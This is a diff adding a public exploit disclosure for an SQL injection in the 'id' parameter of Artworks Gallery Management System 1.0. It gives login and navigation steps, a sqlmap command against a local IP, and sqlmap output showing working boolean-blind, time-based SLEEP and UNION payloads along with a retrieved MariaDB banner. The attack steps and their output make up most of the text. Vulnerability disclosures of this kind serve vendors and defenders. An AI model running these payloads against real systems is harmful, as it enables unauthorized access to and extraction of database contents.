@@ -1,0 +1,64 @@
+# Exploit Title: Artworks Gallery Management System 1.0 - 'id' SQL Injection
+# Exploit Author: Vijay Sachdeva
+# Date: 2020-12-22
+# Vendor Homepage: https://www.sourcecodester.com/php/14634/artworks-gallery-management-system-php-full-source-code.html
+# Software Link: https://www.sourcecodester.com/download-code?nid=14634&title=Artworks+Gallery+Management+System+in+PHP+with+Full+Source+Code
+# Affected Version: Version 1
+# Tested on Kali Linux
+
+Step 1. Log in to the application with admin credentials.
+
+Step 2. Click on "Explore" and then select "Artworks".
+
+Step 3. Choose any item, the URL should be "
+
+http://localhost/art-bay/info_art.php?id=6
+
+Step 4. Run sqlmap on the URL where the "id" parameter is given
+
+
+sqlmap -u "http://192.168.1.240/art-bay/info_art.php?id=8" --banner
+
+---
+
+
+Parameter: id (GET)
+
+    Type: boolean-based blind
+
+    Title: AND boolean-based blind - WHERE or HAVING clause
+
+    Payload: id=8 AND 4531=4531
+
+
+    Type: time-based blind
+
+    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
+
+    Payload: id=8 AND (SELECT 7972 FROM (SELECT(SLEEP(5)))wPdG)
+
+
+    Type: UNION query
+
+    Title: Generic UNION query (NULL) - 9 columns
+
+    Payload: id=8 UNION ALL SELECT
+NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x716b627171,0x63435455546f41476e584f4a66614e445968714d427647756f6f48796153686e756f66715875466c,0x716a6b6b71)--
+-
+
+---
+
+[08:18:34] [INFO] the back-end DBMS is MySQL
+
+[08:18:34] [INFO] fetching banner
+
+back-end DBMS: MySQL >= 5.0.12 (MariaDB fork)
+
+banner: '10.3.24-MariaDB-2'
+
+
+---
+
+
+Step 5. Sqlmap should inject the web-app successfully which leads to
+information disclosure.
